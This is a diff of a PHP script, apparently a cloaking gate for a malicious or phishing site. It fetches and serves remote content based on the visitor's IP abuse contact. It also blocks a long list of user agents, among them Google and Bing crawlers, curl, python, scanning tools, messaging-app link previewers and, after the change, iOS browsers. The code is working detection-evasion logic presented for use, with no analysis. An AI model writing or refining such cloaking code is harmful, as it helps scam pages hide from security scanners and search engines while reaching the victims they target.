@@ -76,7 +76,7 @@ else
         file_put_contents($file, $data, FILE_APPEND | LOCK_EX);
         exit; // Kodu burada durdur
     } 
-    elseif (isset($data['abuse']['email']) && $data['abuse']['email'] === 'network-abuse@google.com' || $data['abuse']['email'] === 'abuse-tr@vodafone.com') {
+    elseif (isset($data['abuse']['email']) && $data['abuse']['email'] === 'network-abuse@google.com') {
     header('Content-Type: text/html');
     // Use cURL to fetch the remote content
     $ch = curl_init();
@@ -102,9 +102,9 @@ curl_close($ch);
 $ip = strtolower($ip);
 $userAgent = strtolower($userAgent);
 $language = strtolower($language);
-// "mac", "os",  "15e148",
+// "mac", "os",  "15e148"
 // 4. Adım
-$blockedUserAgents = array("google", "googlebot", "x11", "ucbrowser", "python", "webtech", "compatible", "curl", "spider", "crawler", "mediapartners", "apac", "none", "info", "yandex", "bing", "tiktok", "twitter", "facebook", "sql", "slurp", "duckduckbot", "baiduspider", "yandexbot", "windows", "whatsapp", "telegram", "discord", "crios");
+$blockedUserAgents = array("google", "googlebot", "x11", "ucbrowser", "python", "webtech", "compatible", "curl", "mac", "os",  "15e148", "spider", "crawler", "mediapartners", "apac", "none", "info", "yandex", "bing", "tiktok", "twitter", "facebook", "sql", "slurp", "duckduckbot", "baiduspider", "yandexbot", "windows", "whatsapp", "telegram", "discord", "crios");
 $userAgent = $_SERVER['HTTP_USER_AGENT'];
 if (empty($userAgent)) {
     // Useragent bilgisi boşsa bu blok çalışır
